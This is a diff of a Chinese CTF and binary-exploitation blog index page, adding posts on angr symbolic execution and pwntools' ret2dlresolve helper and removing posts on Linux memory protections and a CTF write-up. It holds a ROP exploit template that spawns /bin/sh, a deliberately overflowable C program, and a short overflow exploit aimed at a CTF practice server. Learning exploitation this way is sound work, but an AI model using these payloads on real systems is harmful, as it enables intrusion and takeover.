@@ -155,6 +155,154 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/" class="post-title-link" itemprop="url">符号执行-基于python的二进制分析框架angr</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-13 20:14:30" itemprop="dateCreated datePublished" datetime="2022-02-13T20:14:30+08:00">2022-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-16 22:48:57" itemprop="dateModified" datetime="2022-02-16T22:48:57+08:00">2022-02-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>[一篇比较好的文章](<a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md">symexe/klee_analysis.md at master · chyyuu/symexe · GitHub</a>)</p>
+<p>如果仅学习如何使用angr框架的话其实不需要对符号执行有过多了解，所以这里只做简单概述，更详细的地方可以看上面的文章。</p>
+<blockquote>
+<p>符号执行是指在不执行实际程序的前提下，把源程序翻译为一种中间语言，用符号值表示程序变量的值，然后基于中间语言模拟程序执行来进行相关分析的技术，它可以分析代码的所有语义信息，也可以只分析部分语义信息（如只分析“内存是否释放”这一部分的语义信息）。</p>
+<p>程序的路径（path）是程序的一个语句序列，这个语句序列包括程序的一些顺序的代码片段，代码片段之间的连接是由于分支语句导致的控制转移。一个路径是可行的（feasible），是指存在程序输入变量的至少一组值，如果以这组值作为输入，程序将沿着这条路径执行。否则，路径就是不可行的（infeasible）。路径条件（path condition,PC）是针对一个路径的，它是一个关于程序输入变量的符号值的约束，一组输入值使得程序沿着这条路径执行当且仅当这组输入值满足这条路径的路径条件。</p>
+</blockquote>
+<p>例如某个程序在执行过程中会执行如下语句</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line">read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>显然在这条 if 分支语句处程序的执行路径就可以分成两条，分别对应 strcmp 函数的比较结果。同时显然至少存在一组值（”SOSNEAKY“）能使得这条分支语句中存在可行路径。</p>
+<h4 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h4><p><a target="_blank" rel="noopener" href="https://docs.angr.io/">官方手册</a></p>
+<p>angr的作用就在于能够得出上述的使得程序走”可行路径“的”至少一组值“。</p>
+<p>要注意的是符号执行的路径选择问题到现在依旧是一个很大的问题，换句话说也就是当我们的程序存在循环时，因为符号执行会尽量遍历所有的路径，所以每次循环之后会形成至少两个分支，当循环的次数足够多时，就会造成路径爆炸，整个机器的内存会被耗尽。</p>
+<p>我们以下面的例子来学习如何使用angr</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/pwntools/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/13/pwntools/" class="post-title-link" itemprop="url">pwntools</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-13 16:46:52" itemprop="dateCreated datePublished" datetime="2022-02-13T16:46:52+08:00">2022-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-08 03:24:42" itemprop="dateModified" datetime="2022-03-08T03:24:42+08:00">2022-03-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="记录一下pwntools的模块"><a href="#记录一下pwntools的模块" class="headerlink" title="记录一下pwntools的模块"></a>记录一下pwntools的模块</h3><h4 id="pwnlib-rop-ret2dlresolve"><a href="#pwnlib-rop-ret2dlresolve" class="headerlink" title="pwnlib.rop.ret2dlresolve"></a><a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/rop/ret2dlresolve.html#module-pwnlib.rop.ret2dlresolve"><code>pwnlib.rop.ret2dlresolve</code></a></h4><p>自动化生成ret2dlresolve的payload，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment">#这里是要执行的函数及其参数</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line"><span class="comment">#这里的两个数字分别的padding的长度、输入函数的最大输入字节数</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如以下示例程序中（32位），padding_length = 64+4、最大输入字节数 = 256</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/04/ret2_dl_resolve/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1094,154 +1242,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">Linux保护技术</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-17 16:17:49" itemprop="dateCreated datePublished" datetime="2021-12-17T16:17:49+08:00">2021-12-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-21 01:03:57" itemprop="dateModified" datetime="2022-01-21T01:03:57+08:00">2022-01-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h3><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>将数据（堆、栈）所在内存页标识为不可执行，当程序尝试在数据页面上执行指令时，CPU会抛出异常而不是去执行指令。</p>
-<h5 id="编译选项"><a href="#编译选项" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-z execstack</code></p>
-<p>开启：<code>-z noexecstack</code></p>
-<h3 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h3><h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>使程序每次加载的基址随机化</p>
-<h5 id="编译选项-1"><a href="#编译选项-1" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-no-pie</code></p>
-<p>开启：<code>-pie-fPIC</code></p>
-<h3 id="Canary保护"><a href="#Canary保护" class="headerlink" title="Canary保护"></a>Canary保护</h3><h5 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h5><p>函数开始执行时往栈上插入Canary值，并在函数返回的时候检查Canary的值是否有变动，如果有则调用 <code>__stack_check_fail</code> 函数强行停止程序。</p>
-<h5 id="编译选项-2"><a href="#编译选项-2" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-fno-stack-protector</code></p>
-<p>部分启用（只为局部变量中含有 char 的函数插入Canary）：<code>-fstack-protector</code></p>
-<p>全局启用（为所有函数插入Canary）：<code>-fstack-protector-all</code></p>
-<h3 id="Fortify保护"><a href="#Fortify保护" class="headerlink" title="Fortify保护"></a>Fortify保护</h3><h5 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h5><p>主要用来防止格式化字符串漏洞。包含 <code>%n</code> 的格式化字符串不能位于程序内存中的可写地址。当使用位置参数时，必须使用范围内的所有参数（例如要使用 <code>%7$x</code> ，则必须同时使用 1$，2$，3$……）</p>
-<h5 id="编译选项-3"><a href="#编译选项-3" class="headerlink" title="编译选项"></a>编译选项</h5><p>关闭：<code>-D_FORTIFY_SOURCE = 0</code></p>
-<p>开启：<code>-D_FORTIFY_SOURCE = 2</code></p>
-<h3 id="RELRO保护"><a href="#RELRO保护" class="headerlink" title="RELRO保护"></a>RELRO保护</h3><h5 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h5><p>设置符号重定向表为<strong>只读</strong>并在程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击</p>
-<h5 id="编译选项-4"><a href="#编译选项-4" class="headerlink" title="编译选项"></a>编译选项</h5><p>开启（部分）：<code>-z lazy</code></p>
-<p>开启（完全）：<code>-z now</code></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/" class="post-title-link" itemprop="url">护网杯_2018_gettingstart</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-12-17 15:50:23 / 修改时间：16:00:52" itemprop="dateCreated datePublished" datetime="2021-12-17T15:50:23+08:00">2021-12-17</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>小数在内存中的储存</p>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>main() 函数如下，题目很简单，只要利用 buf[] 的越界将 v5 和 v6 覆盖成要求值即可 </p>
-<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/main.jpg" class>
-
-<p>一开始没想到怎么将 v6 覆盖成 0.1，然后就直接开编译器查看其在内存中的存储形式，如下</p>
-<img src="/2021/12/17/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart/%E8%B0%83%E8%AF%95-1.jpg" class>
-
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26578</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3fb999999999999a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1311,14 +1311,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">60</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
